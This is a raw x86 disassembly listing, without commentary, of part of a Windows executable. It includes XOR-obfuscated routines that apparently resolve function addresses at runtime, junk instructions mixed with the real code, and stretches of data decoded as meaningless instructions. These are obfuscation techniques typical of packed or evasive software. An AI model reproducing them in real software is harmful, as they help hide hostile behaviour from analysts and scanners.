  421b91:	sub    BYTE PTR [ebx-0x1ae71150],bh
  421b97:	pop    ecx
  421b98:	cmp    bl,BYTE PTR [ebx-0x7]
  421b9b:	repz test al,0x2e
  421b9e:	pop    DWORD PTR [ecx+0x546e086c]
  421ba4:	dec    edx
  421ba5:	ja     0x421bf4
  421ba7:	cmp    DWORD PTR [edx],edx
  421ba9:	and    esp,DWORD PTR [ecx]
  421bab:	loop   0x421b9c
  421bad:	outs   dx,DWORD PTR ds:[esi]
  421bae:	sbb    edi,DWORD PTR [edi]
  421bb0:	les    ebx,FWORD PTR [esi-0x3f]
  421bb3:	push   edx
  421bb4:	jns    0x421c12
  421bb6:	rol    DWORD PTR [edx],1
  421bb8:	mov    bh,0xda
  421bba:	adc    eax,0x1587dae6
  421bbf:	sub    BYTE PTR [esi+0x718ee68a],bl
  421bc5:	fidivr WORD PTR ss:[ecx]
  421bc8:	inc    edi
  421bc9:	push   es
  421bca:	push   eax
  421bcb:	fcmovne st,st(1)
  421bcd:	or     bh,0xb4
  421bd0:	sub    BYTE PTR [edx+0x49],dh
  421bd3:	add    BYTE PTR [edx+edi*1],cl
  421bd6:	jecxz  0x421c46
  421bd8:	(bad)  
  421bd9:	pop    ebp
  421bda:	inc    edi
  421bdb:	dec    esi
  421bdc:	mov    bl,0x3f
  421bde:	mov    ch,0xf
  421be0:	add    al,0xce
  421be2:	test   BYTE PTR ds:0xaaa3f30,0x6c
  421be9:	pop    ds
  421bea:	cmc    
  421beb:	or     BYTE PTR [esp+ebp*4+0x79e770ae],ah
  421bf2:	popf   
  421bf3:	call   0x5ab11c4c
  421bf8:	imul   ebp,ecx,0x6b2c703e
  421bfe:	sbb    DWORD PTR [ecx+0xd],esp
  421c01:	pop    DWORD PTR [edx]
  421c03:	lock sar edx,cl
  421c06:	ror    BYTE PTR [ebp+edi*4-0x22],cl
  421c0a:	(bad)  
  421c0b:	repnz xchg ebx,eax
  421c0d:	in     eax,0xb6
  421c0f:	lods   al,BYTE PTR ds:[esi]
  421c10:	sbb    ebx,DWORD PTR [eax]
  421c12:	xchg   esi,eax
  421c13:	add    edx,ebp
  421c15:	jb     0x421bf1
  421c17:	sub    al,0x71
  421c19:	rcl    BYTE PTR [esi-0x7f],1
  421c1c:	fwait
  421c1d:	cli    
  421c1e:	fmul   DWORD PTR [eax+esi*1+0x73]
  421c22:	add    al,BYTE PTR [ebp-0x29e3a867]
  421c28:	and    BYTE PTR [edx],al
  421c2a:	fldenv [eax-0x5f]
  421c2d:	jl     0x421bd7
  421c2f:	and    eax,0x2fe3e9dc
  421c34:	das    
  421c35:	(bad)  
  421c36:	jo     0x421c4b
  421c38:	mov    ds:0xb1316caa,al
  421c3d:	sahf   
  421c3e:	ja     0x421bc3
  421c40:	mov    bl,0x84
  421c42:	push   ebx
  421c43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c44:	call   esp
  421c46:	xchg   ecx,eax
  421c47:	or     bl,BYTE PTR [ebx-0x62]
  421c4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c4b:	and    DWORD PTR [esi],esi
  421c4d:	(bad)  
  421c4e:	push   ss
  421c4f:	cmp    BYTE PTR [eax],ch
  421c51:	lds    ecx,FWORD PTR [edi]
  421c53:	(bad)  
  421c54:	sbb    BYTE PTR ds:0xa579327e,dl
  421c5a:	mov    eax,gs:0x9ec36851
  421c60:	outs   dx,DWORD PTR ds:[esi]
  421c61:	mov    eax,0xbaa7508c
  421c66:	inc    ebx
  421c67:	sbb    DWORD PTR [ecx+0x1f121151],ebx
  421c6d:	dec    eax
  421c6e:	(bad)  
  421c6f:	and    cl,BYTE PTR [ecx]
  421c71:	cmp    ch,BYTE PTR [ebx+0x39]
  421c74:	pop    esp
  421c75:	adc    ecx,DWORD PTR [edi+0x2aab87e9]
  421c7b:	dec    ebx
  421c7c:	xor    cl,BYTE PTR [esi-0x73058ab6]
  421c82:	mov    bh,0x14
  421c84:	mov    ds:0xd8f08acf,al
  421c89:	pop    ecx
  421c8a:	mov    bh,0x88
  421c8c:	mov    cl,0x48
  421c8e:	mov    es,WORD PTR [ebx+0x3943e1da]
  421c94:	lds    ebp,FWORD PTR [edi]
  421c96:	test   eax,0x83fa7a2d
  421c9b:	shl    dl,1
  421c9d:	sbb    DWORD PTR [ebx+edx*1],ebx
  421ca0:	lods   eax,DWORD PTR ds:[esi]
  421ca1:	test   dh,dl
  421ca3:	sub    eax,DWORD PTR [ebx]
  421ca5:	mov    ch,0x8
  421ca7:	(bad)  
  421ca8:	(bad)  
  421ca9:	dec    DWORD PTR [ecx-0x1f74b]
  421caf:	dec    DWORD PTR [ebx-0x1e77b]
  421cb5:	(bad)  
  421cb6:	cmp    DWORD PTR [ebp-0x1f8],eax
  421cbc:	je     0x421e11
  421cc2:	mov    eax,DWORD PTR [ebp-0x1f8]
  421cc8:	mov    ecx,DWORD PTR [ebp-0x20c]
  421cce:	movzx  eax,WORD PTR [ecx+eax*4+0x2]
  421cd3:	xor    eax,0xa59b
  421cd8:	movzx  eax,ax
  421cdb:	sar    eax,1
  421cdd:	mov    ecx,DWORD PTR [ebp-0x1f8]
  421ce3:	mov    edx,DWORD PTR [ebp-0x20c]
  421ce9:	movzx  ecx,WORD PTR [edx+ecx*4+0x2]
  421cee:	xor    ecx,0xa59b
  421cf4:	movzx  ecx,cx
  421cf7:	shl    ecx,0xf
  421cfa:	or     eax,ecx
  421cfc:	movzx  eax,ax
  421cff:	mov    DWORD PTR [ebp-0x1fc],eax
  421d05:	jmp    0x421dc7
  421d0a:	jg     0x421cee
  421d0c:	sbb    BYTE PTR [edx-0x144c4344],ch
  421d12:	outs   dx,BYTE PTR ds:[esi]
  421d13:	mov    esp,0x648390cd
  421d18:	(bad)  
  421d19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d1a:	cmp    cl,cl
  421d1c:	sar    BYTE PTR [esi-0x41414200],0xff
  421d23:	(bad)  
  421d24:	loopne 0x421cb9
  421d26:	inc    ebp
  421d27:	and    eax,0x77ae5a01
  421d2c:	adc    al,0xfd
  421d2e:	mov    ecx,0x1fb3370a
  421d33:	aam    0xf6
  421d35:	mov    ?,WORD PTR [eax-0x10e0c428]
  421d3b:	pop    esi
  421d3c:	sub    esp,DWORD PTR [edx]
  421d3e:	xchg   esp,eax
  421d3f:	and    eax,0x352f5fe
  421d44:	pop    DWORD PTR [eax+0x3168afb3]
  421d4a:	popa   
  421d4b:	ss mov eax,0xe46fc97c
  421d51:	add    esi,DWORD PTR [esi-0x754bc81f]
  421d57:	add    eax,0xb604cf09
  421d5c:	imul   edi,esp,0x6c5aa99
  421d62:	jmp    0x43a9:0x229b18b6
  421d69:	jne    0x421db8
  421d6b:	add    BYTE PTR [edx+0x3abfd797],bh
  421d71:	cmc    
  421d72:	mov    al,0xfc
  421d74:	call   0xe25f:0x91d93b84
  421d7b:	in     eax,0x56
  421d7d:	aad    0xa0
  421d7f:	add    ebx,DWORD PTR [edi+edx*4]
  421d82:	adc    DWORD PTR [edx],eax
  421d84:	mov    WORD PTR [ebp+0x9],cs
  421d87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d88:	lods   al,BYTE PTR ds:[esi]
  421d89:	xchg   ebx,eax
  421d8a:	jb     0x421d1e
  421d8c:	push   0x6
  421d8e:	(bad)  
  421d8f:	out    0x29,al
  421d91:	rcr    BYTE PTR [eax+0x56829280],1
  421d97:	out    0x2d,al
  421d99:	adc    ecx,DWORD PTR [edi+0x10019607]
  421d9f:	mov    eax,DWORD PTR [ecx+0x47]
  421da2:	xchg   ebp,eax
  421da3:	leave  
  421da4:	repnz add BYTE PTR [ebx-0x4583e89b],0xd9
  421dac:	(bad)  
  421dad:	call   0x1e3165a1
  421db2:	imul   edx,DWORD PTR [edx-0x748063c3],0xd9498994
  421dbc:	mov    es,edx
  421dbe:	popa   
  421dbf:	mov    ebp,0x43cbe2b3
  421dc4:	jbe    0x421e09
  421dc6:	cdq    
  421dc7:	mov    eax,DWORD PTR [ebp-0x1f8]
  421dcd:	mov    ecx,DWORD PTR [ebp-0x20c]
  421dd3:	movzx  eax,WORD PTR [ecx+eax*4]
  421dd7:	xor    eax,0xa59b
  421ddc:	movzx  eax,ax
  421ddf:	sar    eax,1
  421de1:	mov    ecx,DWORD PTR [ebp-0x1f8]
  421de7:	mov    edx,DWORD PTR [ebp-0x20c]
  421ded:	movzx  ecx,WORD PTR [edx+ecx*4]
  421df1:	xor    ecx,0xa59b
  421df7:	movzx  ecx,cx
  421dfa:	shl    ecx,0xf
  421dfd:	or     eax,ecx
  421dff:	mov    ecx,DWORD PTR [ebp-0x1fc]
  421e05:	mov    BYTE PTR [ebp+ecx*1-0x198],al
  421e0c:	jmp    0x421879
  421e11:	mov    eax,DWORD PTR [ebp-0x1f0]
  421e17:	mov    edx,DWORD PTR [ebp-0x1ec]
  421e1d:	xor    eax,0xcb79b576
  421e22:	xor    edx,0x9c2b8ae8
  421e28:	mov    cl,0x2
  421e2a:	call   0x408bb8
  421e2f:	mov    esi,eax
  421e31:	mov    edi,edx
  421e33:	mov    eax,DWORD PTR [ebp-0x1f0]
  421e39:	mov    edx,DWORD PTR [ebp-0x1ec]
  421e3f:	xor    eax,0xcb79b576
  421e44:	xor    edx,0x9c2b8ae8
  421e4a:	mov    cl,0x3e
  421e4c:	call   0x4223e0
  421e51:	or     esi,eax
  421e53:	or     edi,edx
  421e55:	mov    DWORD PTR [ebp-0x1e4],esi
  421e5b:	mov    eax,DWORD PTR [ebp-0x1e0]
  421e61:	mov    edx,DWORD PTR [ebp-0x1dc]
  421e67:	xor    eax,0xcb79b576
  421e6c:	xor    edx,0x9c2b8ae8
  421e72:	mov    cl,0x2
  421e74:	call   0x408bb8
  421e79:	mov    esi,eax
  421e7b:	mov    edi,edx
  421e7d:	mov    eax,DWORD PTR [ebp-0x1e0]
  421e83:	mov    edx,DWORD PTR [ebp-0x1dc]
  421e89:	xor    eax,0xcb79b576
  421e8e:	xor    edx,0x9c2b8ae8
  421e94:	mov    cl,0x3e
  421e96:	call   0x4223e0
  421e9b:	or     esi,eax
  421e9d:	or     edi,edx
  421e9f:	mov    DWORD PTR [ebp-0x23c],esi
  421ea5:	mov    DWORD PTR [ebp-0x238],edi
  421eab:	mov    eax,DWORD PTR [ebp-0x23c]
  421eb1:	or     eax,DWORD PTR [ebp-0x238]
  421eb7:	je     0x422117
  421ebd:	lea    eax,[ebp-0x204]
  421ec3:	mov    DWORD PTR [ebp-0x208],eax
  421ec9:	mov    eax,DWORD PTR [ebp-0x1e4]
  421ecf:	xor    edx,edx
  421ed1:	mov    cl,0x2
  421ed3:	call   0x4223e0
  421ed8:	mov    esi,eax
  421eda:	mov    edi,edx
  421edc:	mov    eax,DWORD PTR [ebp-0x1e4]
  421ee2:	xor    edx,edx
  421ee4:	mov    cl,0x3e
  421ee6:	call   0x408bb8
  421eeb:	or     esi,eax
  421eed:	or     edi,edx
  421eef:	xor    esi,0xcb79b576
  421ef5:	xor    edi,0x9c2b8ae8
  421efb:	mov    eax,DWORD PTR [ebp-0x208]
  421f01:	mov    DWORD PTR [eax],esi
  421f03:	mov    DWORD PTR [eax+0x4],edi
  421f06:	mov    eax,DWORD PTR [ebp-0x1e4]
  421f0c:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  421f14:	mov    eax,DWORD PTR [ebp-0x1e0]
  421f1a:	mov    edx,DWORD PTR [ebp-0x1dc]
  421f20:	xor    eax,0xcb79b576
  421f25:	xor    edx,0x9c2b8ae8
  421f2b:	mov    cl,0x2
  421f2d:	call   0x408bb8
  421f32:	mov    ebx,eax
  421f34:	mov    edi,edx
  421f36:	mov    eax,DWORD PTR [ebp-0x1e0]
  421f3c:	mov    edx,DWORD PTR [ebp-0x1dc]
  421f42:	xor    eax,0xcb79b576
  421f47:	xor    edx,0x9c2b8ae8
  421f4d:	mov    cl,0x3e
  421f4f:	call   0x4223e0
  421f54:	or     ebx,eax
  421f56:	or     edi,edx
  421f58:	movsx  eax,bl
  421f5b:	cmp    esi,eax
  421f5d:	je     0x4220bd
  421f63:	mov    eax,DWORD PTR [ebp-0x1e4]
  421f69:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  421f71:	mov    eax,DWORD PTR [ebp-0x204]
  421f77:	mov    edx,DWORD PTR [ebp-0x200]
  421f7d:	xor    eax,0xcb79b576
  421f82:	xor    edx,0x9c2b8ae8
  421f88:	mov    cl,0x2
  421f8a:	call   0x408bb8
  421f8f:	mov    edi,eax
  421f91:	mov    ebx,edx
  421f93:	mov    eax,DWORD PTR [ebp-0x204]
  421f99:	mov    edx,DWORD PTR [ebp-0x200]
  421f9f:	xor    eax,0xcb79b576
  421fa4:	xor    edx,0x9c2b8ae8
  421faa:	mov    cl,0x3e
  421fac:	call   0x4223e0
  421fb1:	or     edi,eax
  421fb3:	or     ebx,edx
  421fb5:	mov    eax,DWORD PTR [ebp-0x210]
  421fbb:	movsx  eax,BYTE PTR [eax+edi*1]
  421fbf:	cmp    esi,eax
  421fc1:	je     0x421fd1
  421fc7:	jmp    0x422117
  421fcc:	jmp    0x4220bd
  421fd1:	mov    eax,DWORD PTR [ebp-0x204]
  421fd7:	mov    edx,DWORD PTR [ebp-0x200]
  421fdd:	xor    eax,0xcb79b576
  421fe2:	xor    edx,0x9c2b8ae8
  421fe8:	mov    cl,0x2
  421fea:	call   0x408bb8
  421fef:	mov    esi,eax
  421ff1:	mov    edi,edx
  421ff3:	mov    eax,DWORD PTR [ebp-0x204]
  421ff9:	mov    edx,DWORD PTR [ebp-0x200]
  421fff:	xor    eax,0xcb79b576
  422004:	xor    edx,0x9c2b8ae8
  42200a:	mov    cl,0x3e
  42200c:	call   0x4223e0
  422011:	or     esi,eax
  422013:	or     edi,edx
  422015:	mov    eax,DWORD PTR [ebp-0x210]
  42201b:	movsx  esi,BYTE PTR [eax+esi*1]
  42201f:	mov    eax,DWORD PTR [ebp-0x1f0]
  422025:	mov    edx,DWORD PTR [ebp-0x1ec]
  42202b:	xor    eax,0xcb79b576
  422030:	xor    edx,0x9c2b8ae8
  422036:	mov    cl,0x2
  422038:	call   0x408bb8
  42203d:	mov    ebx,eax
  42203f:	mov    edi,edx
  422041:	mov    eax,DWORD PTR [ebp-0x1f0]
  422047:	mov    edx,DWORD PTR [ebp-0x1ec]
  42204d:	xor    eax,0xcb79b576
  422052:	xor    edx,0x9c2b8ae8
  422058:	mov    cl,0x3e
  42205a:	call   0x4223e0
  42205f:	or     ebx,eax
  422061:	or     edi,edx
  422063:	movsx  eax,bl
  422066:	cmp    esi,eax
  422068:	jne    0x4220bd
  42206e:	mov    eax,DWORD PTR [ebp-0x1e0]
  422074:	mov    edx,DWORD PTR [ebp-0x1dc]
  42207a:	xor    eax,0xcb79b576
  42207f:	xor    edx,0x9c2b8ae8
  422085:	mov    cl,0x2
  422087:	call   0x408bb8
  42208c:	mov    esi,eax
  42208e:	mov    edi,edx
  422090:	mov    eax,DWORD PTR [ebp-0x1e0]
  422096:	mov    edx,DWORD PTR [ebp-0x1dc]
  42209c:	xor    eax,0xcb79b576
  4220a1:	xor    edx,0x9c2b8ae8
  4220a7:	mov    cl,0x3e
  4220a9:	call   0x4223e0
  4220ae:	or     esi,eax
  4220b0:	or     edi,edx
  4220b2:	mov    DWORD PTR [ebp-0x214],esi
  4220b8:	jmp    0x422161
  4220bd:	mov    eax,DWORD PTR [ebp-0x1e0]
  4220c3:	mov    edx,DWORD PTR [ebp-0x1dc]
  4220c9:	xor    eax,0xcb79b576
  4220ce:	xor    edx,0x9c2b8ae8
  4220d4:	mov    cl,0x2
  4220d6:	call   0x408bb8
  4220db:	mov    esi,eax
  4220dd:	mov    edi,edx
  4220df:	mov    eax,DWORD PTR [ebp-0x1e0]
  4220e5:	mov    edx,DWORD PTR [ebp-0x1dc]
  4220eb:	xor    eax,0xcb79b576
  4220f0:	xor    edx,0x9c2b8ae8
  4220f6:	mov    cl,0x3e
  4220f8:	call   0x4223e0
  4220fd:	or     esi,eax
  4220ff:	or     edi,edx
  422101:	add    esi,DWORD PTR [ebp-0x1e4]
  422107:	mov    DWORD PTR [ebp-0x1e4],esi
  42210d:	jmp    0x421e5b
  422112:	jmp    0x421e5b
  422117:	mov    eax,DWORD PTR [ebp-0x1f0]
  42211d:	mov    edx,DWORD PTR [ebp-0x1ec]
  422123:	xor    eax,0xcb79b576
  422128:	xor    edx,0x9c2b8ae8
  42212e:	mov    cl,0x2
  422130:	call   0x408bb8
  422135:	mov    esi,eax
  422137:	mov    edi,edx
  422139:	mov    eax,DWORD PTR [ebp-0x1f0]
  42213f:	mov    edx,DWORD PTR [ebp-0x1ec]
  422145:	xor    eax,0xcb79b576
  42214a:	xor    edx,0x9c2b8ae8
  422150:	mov    cl,0x3e
  422152:	call   0x4223e0
  422157:	or     esi,eax
  422159:	or     edi,edx
  42215b:	mov    DWORD PTR [ebp-0x214],esi
  422161:	mov    eax,DWORD PTR [ebp-0x214]
  422167:	mov    DWORD PTR [ebp-0xc8],eax
  42216d:	cmp    DWORD PTR [ebp-0xc8],0x0
  422174:	je     0x42219e
  42217a:	mov    eax,DWORD PTR [ebp-0x144]
  422180:	mov    ecx,DWORD PTR [ebp-0xac]
  422186:	movzx  eax,WORD PTR [ecx+eax*2]
  42218a:	mov    ecx,DWORD PTR [ebp-0xa8]
  422190:	mov    eax,DWORD PTR [ecx+eax*4]
  422193:	mov    DWORD PTR [ebp-0xfc],eax
  422199:	jmp    0x4221a3
  42219e:	jmp    0x420789
  4221a3:	cmp    DWORD PTR [ebp-0xfc],0x0
  4221aa:	jne    0x4221b7
  4221b0:	xor    eax,eax
  4221b2:	jmp    0x4223d9
  4221b7:	mov    eax,DWORD PTR [ebp+0x8]
  4221ba:	add    eax,DWORD PTR [ebp-0xfc]
  4221c0:	mov    DWORD PTR [ebp-0xec],eax
  4221c6:	mov    DWORD PTR [ebp-0x74],0x0
  4221cd:	cmp    DWORD PTR [ebp-0xb0],0x0
  4221d4:	je     0x422250
  4221da:	cmp    DWORD PTR [ebp-0xb0],0x0
  4221e1:	je     0x422250
  4221e7:	mov    eax,DWORD PTR [ebp-0xb0]
  4221ed:	shl    eax,0x2
  4221f0:	mov    DWORD PTR [ebp-0x74],eax
  4221f3:	mov    DWORD PTR [ebp-0x14c],0x0
  4221fd:	sub    esp,DWORD PTR [ebp-0x74]
  422200:	mov    DWORD PTR [ebp-0x14c],esp
  422206:	mov    DWORD PTR [ebp-0x148],0x0
  422210:	mov    eax,DWORD PTR [ebp-0x148]
  422216:	cmp    eax,DWORD PTR [ebp-0xb0]
  42221c:	je     0x422250
  422222:	mov    eax,DWORD PTR [ebp-0x148]
  422228:	mov    ecx,DWORD PTR [ebp-0x14c]
  42222e:	mov    edx,DWORD PTR [ebp-0x148]
  422234:	mov    esi,DWORD PTR [ebp+0x14]
  422237:	mov    edx,DWORD PTR [esi+edx*4+0x4]
  42223b:	mov    DWORD PTR [ecx+eax*4],edx
  42223e:	mov    eax,DWORD PTR [ebp-0x148]
  422244:	inc    eax
  422245:	mov    DWORD PTR [ebp-0x148],eax
  42224b:	jmp    0x422210
  422250:	mov    DWORD PTR [ebp-0x9c],0x0
  42225a:	push   0x422392
  42225f:	jmp    DWORD PTR [ebp-0xec]
  422265:	mov    eax,eax
  422267:	mov    ecx,esp
  422269:	ret    0x8
  42226c:	cmp    DWORD PTR ds:0x4283f5,0x0
  422273:	not    DWORD PTR ds:0x4283f5
  422279:	mov    DWORD PTR ds:0x42840d,0x5307
  422283:	mov    DWORD PTR ds:0x428565,0x4819
  42228d:	jmp    0x4222cf
  422292:	not    eax
  422294:	cmp    DWORD PTR ds:0x4283f5,0x0
  42229b:	jl     0x4222bd
  4222a1:	push   0x0
  4222a3:	call   DWORD PTR ds:0x42e13c
  4222a9:	add    DWORD PTR ds:0x4284e5,0x4c21
  4222b3:	and    DWORD PTR ds:0x4284cd,0x73e0
  4222bd:	sub    DWORD PTR ds:0x428439,edx
  4222c3:	or     DWORD PTR ds:0x428341,ecx
  4222c9:	sub    DWORD PTR ds:0x4284dd,ebx
  4222cf:	push   ebx
  4222d0:	dec    eax
  4222d1:	push   esi
  4222d2:	mov    eax,DWORD PTR [esp+0x18]
  4222d6:	or     eax,eax
  4222d8:	mov    DWORD PTR ds:0x4283fd,0x72ef
  4222e2:	jne    0x42231e
  4222e8:	mov    ecx,DWORD PTR [esp+0x14]
  4222ec:	mov    eax,DWORD PTR [esp+0x10]
  4222f0:	xor    edx,edx
  4222f2:	inc    ebx
  4222f3:	div    ecx
  4222f5:	sbb    ebx,DWORD PTR ds:0x428549
  4222fb:	mov    ebx,eax
  4222fd:	mov    eax,DWORD PTR [esp+0xc]
  422301:	adc    DWORD PTR ds:0x4284cd,0x42845d
  42230b:	div    ecx
  42230d:	mov    DWORD PTR ds:0x4283f5,0x3a7e
  422317:	mov    edx,ebx
  422319:	jmp    0x42238d
  42231e:	mov    ecx,eax
  422320:	mov    ebx,DWORD PTR [esp+0x14]
  422324:	xor    eax,DWORD PTR ds:0x428569
  42232a:	mov    edx,DWORD PTR [esp+0x10]
  42232e:	mov    eax,DWORD PTR [esp+0xc]
  422332:	mov    DWORD PTR ds:0x428465,0x7dde
  42233c:	shr    ecx,1
  42233e:	mov    DWORD PTR ds:0x428555,0x121c
  422348:	rcr    ebx,1
  42234a:	shr    edx,1
  42234c:	rcr    eax,1
  42234e:	or     ecx,ecx
  422350:	jne    0x422332
  422356:	div    ebx
  422358:	mov    esi,eax
  42235a:	mul    DWORD PTR [esp+0x18]
  42235e:	mov    ecx,eax
  422360:	mov    eax,DWORD PTR [esp+0x14]
  422364:	mul    esi
  422366:	add    edx,ecx
  422368:	jb     0x422388
  42236e:	cmp    edx,DWORD PTR [esp+0x10]
  422372:	ja     0x422388
  422378:	jb     0x422389
  42237e:	cmp    eax,DWORD PTR [esp+0xc]
  422382:	jbe    0x422389
  422388:	dec    esi
  422389:	xor    edx,edx
  42238b:	mov    eax,esi
  42238d:	pop    esi
  42238e:	pop    ebx
  42238f:	ret    0x10
  422392:	sub    DWORD PTR [ebp+0x10],0x1
  422396:	mov    DWORD PTR ds:0x4284d1,0x3767
  4223a0:	cmp    DWORD PTR [ebp+0x10],0x0
  4223a4:	mov    DWORD PTR ds:0x428559,0xcef
  4223ae:	je     0x4223c3
  4223b4:	mov    esi,DWORD PTR ds:0x4284e9
  4223ba:	sbb    DWORD PTR ds:0x428555,esi
  4223c0:	add    esp,DWORD PTR [ebp-0x74]
  4223c3:	mov    DWORD PTR [ebp-0x9c],eax
  4223c9:	mov    eax,DWORD PTR [ebp-0x9c]
  4223cf:	mov    DWORD PTR ds:0x428421,0x5e8f
  4223d9:	pop    edi
  4223da:	pop    esi
  4223db:	pop    ebx
  4223dc:	leave  
  4223dd:	ret    0x10
  4223e0:	cmp    cl,0x40
  4223e3:	mov    DWORD PTR ds:0x428425,0x7c93
  4223ed:	jae    0x42242d
  4223f3:	cmp    cl,0x20
  4223f6:	mov    DWORD PTR ds:0x428361,0x440e
  422400:	jae    0x42240c
  422406:	shld   edx,eax,cl
  422409:	shl    eax,cl
  42240b:	ret    
  42240c:	movzx  edx,WORD PTR ds:0x4284b5
  422413:	add    DWORD PTR ds:0x428465,edx
  422419:	mov    edx,eax
  42241b:	xor    eax,eax
  42241d:	mov    DWORD PTR ds:0x428351,0x5f4f
  422427:	and    cl,0x1f
  42242a:	shl    edx,cl
  42242c:	ret    
  42242d:	xor    eax,eax
  42242f:	xor    edx,edx
  422431:	ret    
	...
  42243e:	add    BYTE PTR [eax],al
  422440:	add    al,0x73
  422442:	xchg   ecx,ebp
  422444:	push   ebx
  422445:	into   
  422446:	jns    0x4224a9
  422448:	push   0x98626f72
  42244d:	xor    eax,0x74b9d761
  422452:	jne    0x4224c2
  422454:	and    dl,bl
  422456:	mov    ch,0xed
  422458:	popf   
  422459:	bnd ret 0xa4
  42245d:	add    BYTE PTR [eax],al
  42245f:	add    BYTE PTR [edi+0x72],ah
  422462:	gs popa 
  422464:	je     0x4224cd
  422466:	jb     0x4224cd
  422468:	popa   
  422469:	je     0x4224d2
  42246b:	jb     0x4224d2
  42246d:	popa   
  42246e:	je     0x4224d7
  422470:	jb     0x4224d7
  422472:	popa   
  422473:	je     0x4224dc
  422475:	jb     0x4224dc
  422477:	popa   
  422478:	je     0x4224e1
  42247a:	jb     0x4224e1
  42247c:	popa   
  42247d:	je     0x4224e6
  42247f:	jb     0x4224e6
  422481:	popa   
  422482:	je     0x4224eb
  422484:	jb     0x4224eb
  422486:	popa   
  422487:	je     0x4224f0
  422489:	jb     0x4224f0
  42248b:	popa   
  42248c:	je     0x4224f5
  42248e:	jb     0x4224f5
  422490:	popa   
  422491:	je     0x422493
  422493:	add    BYTE PTR [eax+0x65],ch
  422496:	ins    BYTE PTR es:[edi],dx
  422497:	ins    BYTE PTR es:[edi],dx
  422498:	push   0x686c6c65
  42249d:	gs ins BYTE PTR es:[edi],dx
  42249f:	ins    BYTE PTR es:[edi],dx
  4224a0:	push   0x686c6c65
  4224a5:	gs ins BYTE PTR es:[edi],dx
  4224a7:	ins    BYTE PTR es:[edi],dx
  4224a8:	push   0x686c6c65
  4224ad:	gs ins BYTE PTR es:[edi],dx
  4224af:	ins    BYTE PTR es:[edi],dx
  4224b0:	push   0x686c6c65
  4224b5:	gs ins BYTE PTR es:[edi],dx
  4224b7:	ins    BYTE PTR es:[edi],dx
  4224b8:	push   0x686c6c65
  4224bd:	gs ins BYTE PTR es:[edi],dx
  4224bf:	ins    BYTE PTR es:[edi],dx
  4224c0:	push   0x686c6c65
  4224c5:	gs ins BYTE PTR es:[edi],dx
  4224c7:	ins    BYTE PTR es:[edi],dx
  4224c8:	add    BYTE PTR [eax],al
  4224ca:	add    BYTE PTR [eax],al
  4224cc:	outs   dx,DWORD PTR ds:[esi]
  4224cd:	add    BYTE PTR [eax+eax*1+0x65],ch
  4224d1:	add    BYTE PTR [ecx+0x0],ah
  4224d4:	jne    0x4224d6
  4224d6:	je     0x4224d8
  4224d8:	xor    eax,DWORD PTR [eax]
  4224da:	xor    al,BYTE PTR [eax]
  4224dc:	add    BYTE PTR [eax],al
  4224de:	add    BYTE PTR [eax],al
  4224e0:	push   0x61006500
  4224e5:	add    BYTE PTR [esi+0x0],dh
  4224e8:	add    BYTE PTR gs:[esi+0x0],ch
  4224ec:	push   0x61006500
  4224f1:	add    BYTE PTR [esi+0x0],dh
  4224f4:	add    BYTE PTR gs:[esi+0x0],ch
  4224f8:	push   0x61006500
  4224fd:	add    BYTE PTR [esi+0x0],dh
  422500:	add    BYTE PTR gs:[esi+0x0],ch
  422504:	push   0x61006500
  422509:	add    BYTE PTR [esi+0x0],dh
  42250c:	add    BYTE PTR gs:[esi+0x0],ch
  422510:	push   0x61006500
  422515:	add    BYTE PTR [esi+0x0],dh
  422518:	add    BYTE PTR gs:[esi+0x0],ch
  42251c:	push   0x61006500
  422521:	add    BYTE PTR [esi+0x0],dh
  422524:	add    BYTE PTR gs:[esi+0x0],ch
  422528:	push   0x61006500
  42252d:	add    BYTE PTR [esi+0x0],dh
  422530:	add    BYTE PTR gs:[esi+0x0],ch
  422534:	push   0x61006500
  422539:	add    BYTE PTR [esi+0x0],dh
  42253c:	add    BYTE PTR gs:[esi+0x0],ch
  422540:	push   0x61006500
  422545:	add    BYTE PTR [esi+0x0],dh
  422548:	add    BYTE PTR gs:[esi+0x0],ch
  42254c:	add    BYTE PTR [eax],al
  42254e:	add    BYTE PTR [eax],al
  422550:	int3   
  422551:	and    al,0x42
  422553:	add    BYTE PTR [edi+0x6c],cl
  422556:	gs dec ecx
  422558:	arpl   WORD PTR [edi+0x6e],bp
  42255b:	push   esp
  42255c:	outs   dx,DWORD PTR ds:[esi]
  42255d:	inc    ebx
  42255e:	jne    0x4225d2
  422560:	jae    0x4225d1
  422562:	jb     0x422564
  422564:	push   esp
  422565:	and    eax,0x42
  42256a:	add    BYTE PTR [eax],al
  42256c:	add    BYTE PTR [eax],al
  42256e:	add    BYTE PTR [eax],al
  422570:	adc    BYTE PTR [ecx],ch
  422572:	inc    edx
  422573:	add    BYTE PTR [eax],bl
  422575:	sub    DWORD PTR [edx+0x0],eax
  422578:	shl    BYTE PTR [edi],1
  42257a:	inc    edx
  42257b:	add    dl,dh
  42257d:	inc    edx
  42257e:	push   ebx
  42257f:	lea    edx,ds:0x1a59ba5
  422585:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422586:	popf   
  422587:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422588:	jno    0x42252f
  42258a:	xchg   edi,eax
  42258b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42258c:	or     esp,DWORD PTR [ebp-0x5aac5a77]
  422592:	and    DWORD PTR [ebp-0x5a7a5ae7],0xffffff9b
  422599:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42259a:	mov    ebx,0xd183d3a5
  42259f:	lea    edx,[ebp-0x645aea5b]
  4225a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225a6:	add    DWORD PTR [ebp-0x5a8e5a63],esp
  4225ac:	xchg   edi,eax
  4225ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225ae:	or     esp,DWORD PTR [ebp-0x5aac5a77]
  4225b4:	and    DWORD PTR [ebp-0x5a7a5acb],0xffffff9b
  4225bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225bc:	mov    ebx,0xd1e3d3a5
  4225c1:	in     eax,dx
  4225c2:	xchg   ebp,eax
  4225c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
